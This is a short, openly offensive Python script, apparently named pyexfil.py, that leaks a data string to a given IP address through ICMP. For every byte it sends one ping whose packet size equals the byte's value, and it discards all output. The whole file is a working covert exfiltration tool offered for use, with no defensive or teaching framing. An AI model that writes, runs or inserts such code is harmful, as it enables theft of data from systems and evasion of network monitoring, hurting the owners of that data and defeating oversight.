import sys
import subprocess

def exfiltrate(ip, data):
    encoded_data = data.encode()  # Correct encoding

    # Ping for each byte
    for byte in encoded_data:
        try:
            # Run ping with -s to send packet with size equivalent to byte value
            subprocess.run(["ping", "-c", "1", "-s", str(byte), ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            print(f"An error occurred: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python pyexfil.py <IP> <data>")
    else:
        ip = sys.argv[1]
        data = sys.argv[2]
        exfiltrate(ip, data)